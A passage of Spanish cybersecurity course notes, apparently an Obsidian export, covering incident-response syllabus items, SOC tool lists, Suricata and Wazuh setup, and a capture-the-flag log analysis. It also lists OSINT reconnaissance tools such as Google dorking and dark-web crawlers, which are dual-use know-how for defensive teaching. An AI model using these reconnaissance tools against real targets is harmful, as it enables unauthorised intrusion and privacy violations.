www.incibe.es/incibe-cert/blog/osint-la-informacion-es-poder\n\nHerramientas\n\nMotores de búsqueda avanzada (Google Dorking).\n\nwww.exploit-db.com/google-hacking-database\n\n\nShodan.io (para buscar dispositivos conectados).\nMaltego (Community Edition).\ntheHarvester.\nOSINT Framework: osintframework.com/\nRedes sociales\n\ngithub.com/sherlock-project/sherlock\n\n\nWayback Machine.\nLeaks\n\ngithub.com/ail-project/ail-framework\ngithub.com/ail-project/lacus\n\n\nDark web\n\ngithub.com/s-rah/onionscan\ngithub.com/DedSecInside/TorBot\n\n\nArtículos\n\nderechodelared.com/herramientas-osint-recopilatorio/\n\n\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/2e---Clasificación,-valoración,-documentación,-seguimiento-inicial-de-incidentes-de-ciberseguridad":{"title":"2e - Clasificación, valoración, documentación, seguimiento inicial de incidentes de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se ha realizado una clasificación, valoración, documentación y seguimiento de los incidentes detectados dentro de la organización.\n\nContenido asociado: Clasificación, valoración, documentación, seguimiento inicial de incidentes de ciberseguridad.\n\nMaterial de apoyo:\n\nIncibe - guía nacional notificación y gestión ciberincidentes (peligrosidad e impacto): www.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nENS: www.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\nPlantillas de informes de incidentes\n\nHerramientas\n\nSIRP (en orden de relevancia):\n\nTheHive: github.com/TheHive-Project/TheHive\nDFIR-Iris: github.com/dfir-iris/iris-web\nFIR (Fast incident response): github.com/certsocietegenerale/FIR\nDFIR-Track: github.com/dfirtrack/dfirtrack\nCatalyst (catalyst.security-brewery.com/)\n\n\nTicketing genéricas (JIRA)\n\nConceptos\n\nIOC\nTLP (Traffic Light Protocol)\n\nwww.first.org/tlp/\nwww.incibe.es/incibe-cert/sobre-incibe-cert/TLP\n\n\nPAP\nSeverity (peligrosidad e impacto)\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/Herramientas-de-un-SOC":{"title":"Herramientas de un SOC","links":[],"tags":[],"content":"Herramientas de un SOC\nSIEM\nEl siem es una herramienta de monitorización.\n\nELK\nSplunk\nQRadar\n\nEDR\n\nWazuh\nMicrosoft SentinelOne\n\nNetworkd IDS/IPS\n\nSnort\nSuricata\n\nHost IDS/IPS\n\nOSSEC\nFleet + OSQuery\n\nBehavioral Network Analyzer\n\nZeek (antiguo Bro)\n\nDFIR\n\nVelociraptor\n\nSIRP\n\nTheHive\nDFIR-Iris\nDFIRTrack\nFast Incident Response (FIR)\nJIRA (genérica)\n\nSOAR\n\nCatalyst\n\nFirewall\n\nHardware\nSoftware\n\nIPTables\nNFTables\n\n\n\nThreat Intelligence\n\nVirusTotal\nURLScan\nPalo alto network scanner\nAnyRun\nAbuseIPDB\nCisco Talos\n\nIOC\n\nMISP\nCortex\n\nHoneypots\nFrameworks\n\nNIST\nIncibe\nEsquema nacional de seguridad\n\nThreat hunting\n\nMitre ATT&amp;CK\n\nSO especializados\n\nSecurity Onion\nQubeOS\nTails\nWhonix\nFedora Silverblue\n\nOtros\n\nIAM\nNDR\n\nDigital Forensics (DF)\n\nAutopsy\nVolatility\nReglas Yara\nReglas Sigma\nWireshark\n\nConceptos\n\nTaxonomía de incidentes\nTLP\nSeverity\nPlaybook\n\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/guías/Aprendizaje-automático-aplicado-a-la-ciberseguridad":{"title":"Aprendizaje automático aplicado a la ciberseguridad","links":[],"tags":[],"content":"Para este apartado me baso en el github github.com/cylance/IntroductionToMachineLearningForSecurityPros, el cual contiene un libro (libre) muy bueno para aprender “Introduction to Artificial Intelligence for Security Professionals”. En este caso lo he adaptado para profesionales con conocimientos limitados de programación.\n\nConceptos a Impartir (De Básico a Avanzado)\nEl objetivo es llevar al alumnado desde cero (o casi cero) en programación hasta comprender y poder ejecutar (y eventualmente modificar) los ejemplos del libro.\nMódulo 1: Fundamentos de Programación con Python (Esencial)\n\nObjetivo: Dotar al alumnado de las herramientas básicas de programación necesarias para entender y escribir scripts simples.\nConceptos:\n\nIntroducción a Python: ¿Qué es? ¿Por qué Python para IA/Seguridad?\nEntorno de desarrollo: Instalación de Python, uso de un IDE (como VS Code con extensión Python) o Entornos Interactivos (Jupyter Notebooks / Google Colab ). Gestión básica de paquetes con pip. Entornos virtuales (venv).\nSintaxis básica: Variables, tipos de datos (números, strings, booleanos, listas, tuplas, diccionarios, sets).\nOperadores: Aritméticos, de comparación, lógicos.\nEstructuras de control: Condicionales (if, elif, else), bucles (for, while).\nFunciones: Definición, argumentos, retorno de valores. Ámbito (scope) de variables.\nManejo de errores básicos: Bloques try...except.\nEntrada/Salida básica: Leer y escribir en archivos de texto (.txt, .csv).\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo1.ipynb.\n\nEnlace: ejercicios_modulo1.ipynb\n\n\n\nMódulo 2: Manipulación de Datos con Python\n\nObjetivo: Aprender a cargar, explorar, limpiar y preparar datos, una tarea fundamental en cualquier proyecto de ML.\nConceptos:\n\nIntroducción a NumPy: Arrays multidimensionales, operaciones vectorizadas eficientes, indexación y slicing.\nIntroducción a Pandas:\n\nSeries y DataFrames: Las estructuras de datos clave.\nLectura y escritura de datos (CSV, JSON, etc.).\nSelección e indexación de datos (loc, iloc).\nLimpieza de datos básicos: Manejo de valores nulos (NaN), eliminación de duplicados.\nAgregación y agrupación de datos (groupby).\nVisualización básica de datos con Pandas (integrado con Matplotlib).\n\n\nIntroducción a Matplotlib/Seaborn: Creación de gráficos básicos (histogramas, scatter plots, box plots) para explorar los datos.\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo2.ipynb.\n\nEnlace: ejercicios_modulo2.ipynb\n\n\n\nMódulo 3: Fundamentos de Inteligencia Artificial y Machine Learning (Conceptual)\n\nObjetivo: Entender los conceptos teóricos clave detrás del ML antes de implementar algoritmos.\nConceptos:\n\n¿Qué es la Inteligencia Artificial? ¿Qué es el Machine Learning? Diferencias.\nTipos de Aprendizaje:\n\nSupervisado: Clasificación y Regresión (conceptos, ejemplos en seguridad: detección de malware vs. predicción de ataques).\nNo Supervisado: Clustering y Reducción de Dimensionalidad (conceptos, ejemplos en seguridad: detección de anomalías, agrupación de tráfico de red).\n(Opcional/Breve) Aprendizaje por Refuerzo.\n\n\nEl Proceso de ML: Recolección de datos → Preprocesamiento/Ingeniería de características → Selección del modelo → Entrenamiento → Evaluación → Despliegue.\nConceptos Clave: Características (Features), Etiquetas (Labels), Conjunto de Entrenamiento (Training Set), Conjunto de Prueba (Test Set), Conjunto de Validación (Validation Set).\nProblemas Comunes: Sobreajuste (Overfitting) y Subajuste (Underfitting). Sesgo (Bias) y Varianza (Variance).\nMétricas de Evaluación Básicas:\n\nPara Clasificación: Accuracy, Precisión, Recall, F1-Score, Matriz de Confusión. Curva ROC y AUC (explicación conceptual).\nPara Regresión: MSE, MAE (mencionar brevemente).\nPara Clustering: Silhouette Score (mencionar brevemente).\n\n\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo3.ipynb.\n\nEnlace: ejercicios_modulo3.ipynb\n\n\n\nMódulo 4: Algoritmos de Machine Learning y Aplicaciones en Ciberseguridad (Práctico)\n\nObjetivo: Implementar algoritmos básicos de ML usando scikit-learn y conectarlos con problemas de seguridad, preparando el terreno para los ejemplos del libro.\nConceptos:\n\nIntroducción a Scikit-learn: La librería estándar de ML en Python. API consistente (fit, predict, transform).\nPreprocesamiento de Datos con Scikit-learn: Escalado de características (StandardScaler, MinMaxScaler), Codificación de variables categóricas (OneHotEncoder, LabelEncoder).\nAlgoritmos de Clasificación (con ejemplos simples de seguridad):\n\nRegresión Logística: Detección simple de spam o phishing.\nK-Nearest Neighbors (KNN): Clasificación simple basada en similitud.\nÁrboles de Decisión y Random Forests: Modelos más potentes, entender su interpretabilidad (árbol) y robustez (bosque). Ejemplo: clasificación básica de malware basada en características simples.\n\n\nAlgoritmos de Clustering (con ejemplos simples de seguridad):\n\nK-Means: Agrupación de logs de red para detectar patrones o anomalías.\n\n\nIngeniería de Características (Feature Engineering) Específica de Seguridad (Introducción):\n\n¿Qué es? ¿Por qué es crucial en seguridad?\nEjemplos conceptuales (sin entrar aún en el código complejo del libro): extraer longitud de URL, número de caracteres especiales (phishing); extraer información de cabeceras de ejecutables PE (malware); contar tipos de peticiones en logs web (ataques).\n\n\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo4.ipynb.\n\nEnlace: ejercicios_modulo4.ipynb\n\n\n\nMódulo 5: Implementación con Ejemplos del Libro/Repositorio Cylance\n\nObjetivo: Analizar, ejecutar y entender el código del repositorio Cylance, aplicando todo lo aprendido.\nConceptos:\n\nAnálisis Guiado del Código: Seleccionar 1-2 ejemplos clave del repositorio (empezar por los más sencillos, si los hay).\nDesglose del Código:\n\nCarga y preprocesamiento de datos específicos del ejemplo (e.g., datos de ficheros PE, logs de red). Explicar el porqué de cada paso de preprocesamiento.\nIngeniería de características aplicada: Ver cómo se extraen las features relevantes para ese problema de seguridad específico.\nEntrenamiento del modelo: Ejecutar el entrenamiento, entender los parámetros utilizados.\nEvaluación del modelo: Interpretar las métricas de rendimiento en el contexto del problema de seguridad. ¿Qué significa una alta precisión o un alto recall en detección de malware?\nVisualización de resultados (si el ejemplo la incluye).\n\n\nAdaptación y Experimentación: Animar a los alumnos a hacer pequeñas modificaciones (cambiar parámetros, probar otro modelo simple) para ver cómo afecta al resultado.\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo5.ipynb.\n\nEnlace: ejercicios_modulo5.ipynb\n\n\n\nMódulo 6: Consideraciones Éticas y Próximos Pasos (Cierre)\n\nObjetivo: Reflexionar sobre el uso responsable de la IA y las limitaciones.\nConceptos:\n\nSesgos en los datos y algoritmos de IA en seguridad.\nImportancia de la interpretabilidad (Explainable AI - XAI): ¿Por qué el modelo tomó esa decisión?\nAdversarial Machine Learning: Ataques contra modelos de IA.\nLimitaciones actuales de la IA en ciberseguridad.\nRecursos para seguir aprendiendo.\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo6.ipynb.\n\nEnlace: ejercicios_modulo6.ipynb\n\n\n\n\n\nHerramientas Recomendadas:\n\nPython 3.x\nJupyter Notebook / JupyterLab / Google Colaboratory\nBibliotecas: NumPy, Pandas, Matplotlib, Seaborn, Scikit-learn\nGit y GitHub (para compartir código y usar el repositorio de Cylance)\n\n\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/guías/Suricata":{"title":"Suricata","links":[],"tags":[],"content":"Suricata\nInstalación de software previo\napt update\napt install software-properties-common iproute-2 nano curl -y\napt install suricata -y\n\nVer la interfaz de red a usar y anotarla:\nip a\nnano /etc/suricata/suricata.yaml\n\nDentro del archivo, cambiar las siguientes 4 cosas:\n...\n\n  community-id: true\n  \n...\n\naf-packet:\n  - interface: &lt;la-anotada-tras-ip-a&gt;\n  \n... \n\ndefault-rule-path: /var/lib/suricata/rules\n\nrule-files:\n  - suricata.rules\n  \n...\n\n# Al final del archivo, incluir:\ndetect-engine:\n  -  rule-reload: true\n\nTras esto, guardar el archivo y ejecutar los siguientes comandos:\nsuricata-update\nsuricata-update list-sources\nsuricata-update enable-source et/open\nsuricata -T -c /etc/suricata/suricata.yaml -v\n\nSi nos da ok, todo está bien, habilitamos suricata cambiando el siguiente archivo:\nnano /etc/default/suricata\n\nDentro del archivo modificar “RUN=yes”\nFinalmente reiniciamos suricata:\npidof suricata\nkill &lt;pid-anterior&gt;\nsystemctl restart suricata\nsystemctl enable suricata\n\nProbamos suricata\ncurl testmynids.org/uid/index.html\ngrep 2100498 /var/log/suricata/fast.log\njq &#039;select(.alert .signature_id==2100498)&#039; /var/log/suricata/eve.json\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/guías/Wazuh":{"title":"Wazuh","links":[],"tags":[],"content":"Qué es Wazuh\nUn EDR (Endpoint Detection and Response)\nCómo instalar Wazuh\nEn AWS con Amazon Linux 2:\n# Para instalar docker\nsudo dnf install docker -y\nsudo systemctl start docker\nsudo systemctl enable docker\nsudo usermod -aG docker $USER\n \n# Aplicar los cambios a los grupos\nnewgrp docker\n \n# Para docker-compose: gist.github.com/npearce/6f3c7826c7499587f00957fee62f8ee9\nsudo curl -L github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\n \n# Probar que todo va bien\ndocker --version\ndocker-compose --version\n \n# Siguiendo la guía de Wazuh: \n# documentation.wazuh.com/current/deployment-options/docker/wazuh-container.html\nsudo dnf install git -y\ngit clone github.com/wazuh/wazuh-docker.git -b v4.11.2\ncd wazuh-docker/single-node\ndocker-compose -f generate-indexer-certs.yml run --rm generator\ndocker-compose up -d\n \n# Se habrán generado 3 contenedores. \n# Para que los contenedores se enciendan automáticamente al encender la instancia\ndocker update --restart=always &lt;nombre-contenedor | ID&gt;\nDespués de un tiempo ya podremos acceder a https://IP con el usuario admin y la contraseña SecretPassword.\nDespués de esto hay que tener en cuenta los puertos que usa Wazuh y que habrá que abrirlos en el Security Group (firewall) de la instancia EC2. Más info en: documentation.wazuh.com/current/getting-started/architecture.html#required-ports\n¿Cómo se gestionan las reglas en Wazuh?\nDebemos acceder a la carpeta /var/ossec. Recordemos que ossec es una herramienta HIDS que usa Wazuh dentro de su arquitectura.\n\nLas reglas por defecto se encuentran en /var/ossec/ruleset/rules/. No debes modificar directamente estos archivos, ya que se sobrescribirían en las actualizaciones.\nLas personalizaciones, como la creación de nuevas reglas o la modificación del comportamiento de las existentes (por ejemplo, cambiar su nivel o desactivarlas), se hacen principalmente en /var/ossec/etc/rules/local_rules.xml.\nLas reglas tienen un level (nivel). Por defecto, Wazuh suele generar alertas para reglas con nivel 3 o superior (esto se configura en ossec.conf).\nLas reglas están organizadas lógicamente en archivos según su propósito (por ejemplo, 0015-ossec_rules.xml, 0210-pci_rules.xml, 0370-auditd_rules.xml, 0575-win_security_rules.xml, etc.). Wazuh carga las reglas incluidas en la configuración.\n\n  &lt;rule id=&quot;100100&quot; level=&quot;12&quot;&gt;\n    &lt;decoded_as&gt;execve&lt;/decoded_as&gt;\n    &lt;command&gt;whoami&lt;/command&gt;\n    &lt;description&gt;Command &#039;whoami&#039; executed&lt;/description&gt;\n  ​&lt;/rule&gt;\n\nInstalación de un agente\nEs muy sencillo, simplemente ir desde la web a crear un nuevo agente y seguir los pasos. En mi caso:\ncurl -o wazuh-agent-4.11.2-1.x86_64.rpm packages.wazuh.com/4.x/yum/wazuh-agent-4.11.2-1.x86_64.rpm\n \nsudo WAZUH_MANAGER=&#039;IP&#039; WAZUH_AGENT_GROUP=&#039;GRUPO&#039; WAZUH_AGENT_NAME=&#039;NOMBRE&#039; rpm -ihv wazuh-agent-4.11.2-1.x86_64.rpm\n \nsudo systemctl daemon-reload\nsudo systemctl enable wazuh-agent\nsudo systemctl start wazuh-agent"},"CETI/Incidentes-de-ciberseguridad/RA-3/3a---Recopilación-de-evidencias":{"title":"3a - Recopilación de evidencias","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se han recopilado y almacenado de forma segura evidencias de incidentes de ciberseguridad que afectan a la organización.\n\nContenido asociado: Recopilación de evidencias.\n\nHerramientas\n\nDFIR: Velociraptor\nImágenes Forenses: FTK Imager (gratuito), dd / dc3dd (Linux).\n\nExplicar formatos (E01, raw).\n\n\nAdquisición de Memoria: Volatility Framework (plugins de adquisición), Redline (FireEye).\nCadena de Custodia: Plantillas de formularios.\nHashing: Herramientas para calcular hashes (md5sum, sha256sum, FTK Imager).\nAlmacenamiento Seguro: Contenedores cifrados (VeraCrypt).\n"},"CETI/Incidentes-de-ciberseguridad/RA-3/3b---Análisis-de-evidencias.":{"title":"3b - Análisis de evidencias.","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se ha realizado un análisis de evidencias.\n\nContenido asociado: Análisis de evidencias.\n\nHerramientas\n\nComprobación web de IOCs\n\nVirusTotal\nMetadefender: metadefender.com/\nURLScan\nPalo alto network scanner\nAnyRun\nAbuseIPDB\nCisco Talos\n\n\nPlataformas Forenses: Autopsy (open source), EnCase/FTK (comerciales, quizás versiones de prueba/educacionales si existen).\nAnálisis de Memoria: Volatility Framework\nAnálisis de Red: Wireshark.\nAnálisis de Logs: Herramientas de SIEM, grep, awk, Log2Timeline/Plaso.\nherramientas de análisis estático: strings, PEview\neditores hexadecimales: HxD\nSandbox\n\ngithub.com/kevoreilly/CAPEv2\ngithub.com/cert-ee/cuckoo3\n\n\n"},"CETI/Incidentes-de-ciberseguridad/RA-3/3c---Investigación-del-incidente":{"title":"3c - Investigación del incidente","links":["CETI/Incidentes-de-ciberseguridad/RA-2/2e---Clasificación,-valoración,-documentación,-seguimiento-inicial-de-incidentes-de-ciberseguridad"],"tags":[],"content":"Criterio de evaluación:\nc) Se ha realizado la investigación de incidentes de ciberseguridad.\n\nContenido asociado: Investigación del incidente\n\nConceptos\n\nMetodologías de investigación (basadas en hipótesis).\n\nHerramientas\n\nHerramientas de línea de tiempo (Timeline Explorer, Plaso).\nHerramientas de mind mapping (FreeMind, XMind) para organizar hallazgos.\n\nSe puede usar obsidian con plugin mindmap\n\n\nAnálisis\n\nAutopsy\nVolatility\nReglas Yara\nReglas Sigma\nWireshark\n\n\nPlataformas de gestión de casos (TheHive o DFIR-Iris, ya usadas en 2e - Clasificación, valoración, documentación, seguimiento inicial de incidentes de ciberseguridad).\n"},"CETI/Incidentes-de-ciberseguridad/RA-3/3d---Intercambio-de-información-del-incidente-con-proveedores-u-organismos-competentes.":{"title":"3d - Intercambio de información del incidente con proveedores u organismos competentes.","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se ha intercambiado información de incidentes, con proveedores y/o organismos competentes que podrían hacer aportaciones al respecto.\n\nContenido asociado: Intercambio de información del incidente con proveedores u organismos competentes.\n\nHerramientas para intercambiar información de IOC\n\nMISP\nCortex\n\nCERT relevantes\n\nINCIBE-CERT\nCCN-CERT\nENISA - CERTs europeos: tools.enisa.europa.eu/topics/incident-response/csirt-inventory/certs-by-country-interactive-map\n\nFormato de intercambio de Cyberthreat intelligence (CTI)\n\nSTIX\nTAXII\n\nHerramientas de comunicación segura\n\nPGP\n\nEjemplo: incibe www.incibe.es/incibe-cert/sobre-incibe-cert/claves-publicas-pgp\n\n\nSignal\n"},"CETI/Incidentes-de-ciberseguridad/RA-3/3e---Medidas-de-contención-de-incidentes.":{"title":"3e - Medidas de contención de incidentes.","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se han iniciado las primeras medidas de contención de los incidentes para limitar los posibles daños causados.\n\nContenido asociado: Medidas de contención de incidentes.\n\nHerramientas\n\nMitre ATT&amp;CK\n\nTécnicas\n\nTécnicas de aislamiento (desconexión de red, VLANs).\nBloqueo en firewalls/proxies (interfaces de gestión simuladas o reales si es posible).\nDeshabilitación de cuentas (Active Directory/Linux).\n\nOtros\n\nPlaybooks/checklists de contención para tipos específicos de incidentes (ej. ransomware).\n"},"CETI/Incidentes-de-ciberseguridad/RA-3/guías/analisis-de-logs":{"title":"analisis-de-logs","links":[],"tags":[],"content":"Análisis de logs\nComandos interesantes:\n\ncut\nsort\nuniq\nnl\nwc\ngrep\nbase64\n\nPregunta 1\ncut -d &#039; &#039; -f2 access.log | sort | uniq -c | sort -n | nl\nPregunta 2\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 |sort | uniq | sort -n | nl\nPregunta 3\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 | sort | uniq -c | sort -nr\ngrep partnerservices.getmicrosoftkey.com access.log | cut -d &#039; &#039; -f6 | sort | uniq\nPregunta 4\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 |sort | uniq -c | sort -n | nl | tail -n 5\nPregunta 5\ngrep frostlings.bigbadstash.thm access.log | grep 200 | cut -d &#039; &#039; -f2 | sort | uniq\nPregunta 6\ngrep frostlings.bigbadstash.thm access.log | cut -d &#039; &#039; -f5 | cut -d &#039;=&#039; -f2 | base64 -d\ngrep frostlings.bigbadstash.thm access.log | cut -d &#039; &#039; -f5 | cut -d &#039;=&#039; -f2 | base64 -d | grep -i THM{"},"CETI/Incidentes-de-ciberseguridad/RA-4/4a---Desarrollar-procedimientos-de-actuación-detallados-para-dar-respuesta,-mitigar,-eliminar-o-contener-los-tipos-de-incidentes":{"title":"4a - Desarrollar procedimientos de actuación detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se han desarrollado procedimientos de actuación detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes de ciberseguridad más habituales.\n\nContenido asociado: Desarrollar procedimientos de actuación detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes.\n\nConceptos\n\nPlantillas de IRP (ej. SANS).\nEjemplos de playbooks específicos (malware, phishing, etc.).\nPlaybooks, Runbooks, Standard Operation Procedure…\n\nHerramientas\n\nHerramientas de diagramación (draw.io, Visio) para flujos de trabajo.\nSe puede usar Obsidian (herramienta Canvas de obsidian)\n"},"CETI/Incidentes-de-ciberseguridad/RA-4/4b---Implantar-capacidades-de-ciberresiliencia":{"title":"4b - Implantar capacidades de ciberresiliencia","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se han preparado respuestas ciberresilientes ante incidentes que permitan seguir prestando los servicios de la organización y fortaleciendo las capacidades de identificación, detección, prevención, contención, recuperación y cooperación con terceros.\n\nContenido asociado: Implantar capacidades de ciberresiliencia.\n\nConceptos\n\nConceptos de BCP/DRP (plantillas básicas).\nSoftware de backup (ej. Veeam - versión comunitaria, herramientas nativas de SO).\nTecnologías de virtualización (VMware, VirtualBox, Hyper-V) para discutir alta disponibilidad/failover.\nDiscusión sobre redundancia (RAID, balanceadores de carga).\n\nSO especializados\n\nSecurity Onion\nQubeOS\nTails\nWhonix\nFedora Silverblue\n"},"CETI/Incidentes-de-ciberseguridad/RA-4/4c---Establecer-flujos-de-toma-de-decisiones-y-escalado-interno-o-externo-adecuados":{"title":"4c - Establecer flujos de toma de decisiones y escalado interno o externo adecuados","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se ha establecido un flujo de toma de decisiones y escalado de incidentes interno y/o externo adecuados.\n\nContenido asociado: Establecer flujos de toma de decisiones y escalado interno y/o externo adecuados.\n\nConceptos\n\nMatrices de escalado.\nDiagramas de flujo de comunicación.\nDefinición de roles y responsabilidades (matriz RACI).\nHerramientas de comunicación colaborativa (Slack, Teams - simulación).\n"},"CETI/Incidentes-de-ciberseguridad/RA-4/4d---Tareas-para-reestablecer-los-servicios-afectados-por-incidentes":{"title":"4d - Tareas para reestablecer los servicios afectados por incidentes","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se han llevado a cabo las tareas de restablecimiento de los servicios afectados por un incidente hasta confirmar la vuelta a la normalidad.\n\nContenido asociado: Tareas para reestablecer los servicios afectados por incidentes.\n\nHerramientas\n\nHerramientas de gestión de parches (WSUS, apt/yum).\nEscáneres de vulnerabilidades (OpenVAS/GVM, Nessus Essentials).\nGuías de hardening (CIS Benchmarks).\nProcedimientos de restauración de backups.\nChecklists de validación post-recuperación.\n"},"CETI/Incidentes-de-ciberseguridad/RA-4/4e---Documentación":{"title":"4e - Documentación","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se han documentado las acciones realizadas y las conclusiones que permitan mantener un registro de “lecciones aprendidas”.\n\nContenido asociado: Documentación\n\nConceptos\n\nPlantillas de informes post-incidente.\nPlataformas de documentación (Wikis como MediaWiki, Confluence, SharePoint).\nAgendas/plantillas para reuniones de “lecciones aprendidas”.\n"},"CETI/Incidentes-de-ciberseguridad/RA-4/4f----Seguimiento-de-incidentes-para-evitar-una-situación-similar":{"title":"4f -  Seguimiento de incidentes para evitar una situación similar","links":[],"tags":[],"content":"Criterio de evaluación:\nf) Se ha realizado un seguimiento adecuado del incidente para evitar que una situación similar se vuelva a repetir.\n\nContenido asociado: Seguimiento de incidentes para evitar una situación similar.\n\nConceptos\n\nHerramientas de monitorización (SIEM, Nagios, Zabbix) para verificar la normalidad y detectar recurrencias.\nSistemas de ticketing para seguimiento de acciones correctivas a largo plazo.\n"},"CETI/Incidentes-de-ciberseguridad/RA-5/5a---Desarrollar-procedimientos-de-actuación-para-la-notificación-de-incidentes":{"title":"5a - Desarrollar procedimientos de actuación para la notificación de incidentes","links":[],"tags":[],"content":"Criterios de evaluación:\na) Se ha desarrollado un procedimiento de actuación detallado para la notificación de incidentes de ciberseguridad en los tiempos adecuados.\n\nContenido asociado: Desarrollar procedimientos de actuación para la notificación de incidentes.\n\nConceptos\n\nGuías de notificación de la AEPD, INCIBE-CERT, CCN-CERT.\nPlantillas de procedimientos de notificación interna/externa.\nDiagramas de flujo con criterios y plazos.\n\nMaterial de apoyo:\n\nIncibe - guía naciona de notificación y gestión de ciberincidentes: www.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nCCN-CERT www.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\n"},"CETI/Incidentes-de-ciberseguridad/RA-5/5b---Notificación-interna-de-incidentes":{"title":"5b - Notificación interna de incidentes","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se ha notificado el incidente de manera adecuada al personal interno de la organización responsable de la toma de decisiones.\n\nContenido asociado: Notificación interna de incidentes.\n\nConceptos\n\nPlantillas de correo electrónico/comunicado interno.\nListas de contactos clave internos (simuladas).\n"},"CETI/Incidentes-de-ciberseguridad/RA-5/5c---Notificación-de-incidentes-a-quienes-corresponda":{"title":"5c - Notificación de incidentes a quienes corresponda","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se ha notificado el incidente de manera adecuada a las autoridades competentes en el ámbito de la gestión de incidentes de ciberseguridad en caso de ser necesario.\n\nContenido asociado: Notificación de incidentes a quienes corresponda.\n\nConceptos\n\nPlantillas de correo electrónico/comunicado interno.\nListas de contactos clave internos (simuladas).\n\nMateriales de apoyo\n\nIncibe: www.incibe.es/empresas/te-ayudamos/reporta-tu-incidente\nIncibe - PGP: www.incibe.es/incibe-cert/sobre-incibe-cert/claves-publicas-pgp\nCCN-CERT: www.ccn-cert.cni.es/es/gestion-de-incidentes/notificacion-de-incidentes\n"},"CETI/Incidentes-de-ciberseguridad/RA-5/5d---Notificación-forma-de-incidentes-a-afectados":{"title":"5d - Notificación forma de incidentes a afectados","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se ha notificado formalmente el incidente a los afectados, personal interno, clientes, proveedores, etc., en caso de ser necesario.\nConceptos\n\nGuías sobre requisitos del RGPD (Art. 34).\nPlantillas de notificación a afectados (clientes, empleados).\nConsideraciones sobre el canal de comunicación (email, carta, web).\n"},"CETI/Incidentes-de-ciberseguridad/RA-5/5e---Notificación-de-incidentes-a-medios-de-comunicación":{"title":"5e - Notificación de incidentes a medios de comunicación","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se ha notificado el incidente a los medios de comunicación en caso de ser necesario.\nConceptos\n\nPrincipios de comunicación de crisis.\nPlantillas de comunicados de prensa (muy básicos).\nDiscusión sobre la figura del portavoz.\nEjemplos (buenos y malos) de gestión de comunicación de incidentes públicos.\n"},"CETI/Incidentes-de-ciberseguridad/Temario":{"title":"Temario","links":["CETI/Incidentes-de-ciberseguridad/RA-1/1a---Principios-generales-en-materia-de-ciberseguridad","CETI/Incidentes-de-ciberseguridad/RA-1/1b---Normativa-de-protección-del-puesto-del-trabajo.","CETI/Incidentes-de-ciberseguridad/RA-1/1c---Plan-de-formación-y-concienciación-en-materia-de-ciberseguridad","CETI/Incidentes-de-ciberseguridad/RA-1/1d---Materiales-de-formación-y-concienciación","CETI/Incidentes-de-ciberseguridad/RA-1/1e---Auditorías-internas-de-cumplimiento-en-materia-de-prevención","CETI/Incidentes-de-ciberseguridad/RA-2/2a---Taxonomía-de-incidentes-de-ciberseguridad","CETI/Incidentes-de-ciberseguridad/RA-2/2b---Monitorización,-identificación,-detección-y-alerta-de-incidentes","CETI/Incidentes-de-ciberseguridad/RA-2/2c---Detección-e-identificación-de-incidentes-de-seguridad-física","CETI/Incidentes-de-ciberseguridad/RA-2/2d---Monitorización,-identificación,-detección-y-alerta-de-incidentes-a-través-de-OSINT","CETI/Incidentes-de-ciberseguridad/RA-2/2e---Clasificación,-valoración,-documentación,-seguimiento-inicial-de-incidentes-de-ciberseguridad","CETI/Incidentes-de-ciberseguridad/RA-3/3a---Recopilación-de-evidencias","CETI/Incidentes-de-ciberseguridad/RA-3/3b---Análisis-de-evidencias.","CETI/Incidentes-de-ciberseguridad/RA-3/3c---Investigación-del-incidente","CETI/Incidentes-de-ciberseguridad/RA-3/3d---Intercambio-de-información-del-incidente-con-proveedores-u-organismos-competentes.","CETI/Incidentes-de-ciberseguridad/RA-3/3e---Medidas-de-contención-de-incidentes.","CETI/Incidentes-de-ciberseguridad/RA-4/4a---Desarrollar-procedimientos-de-actuación-detallados-para-dar-respuesta,-mitigar,-eliminar-o-contener-los-tipos-de-incidentes","CETI/Incidentes-de-ciberseguridad/RA-4/4b---Implantar-capacidades-de-ciberresiliencia","CETI/Incidentes-de-ciberseguridad/RA-4/4c---Establecer-flujos-de-toma-de-decisiones-y-escalado-interno-o-externo-adecuados","CETI/Incidentes-de-ciberseguridad/RA-4/4d---Tareas-para-r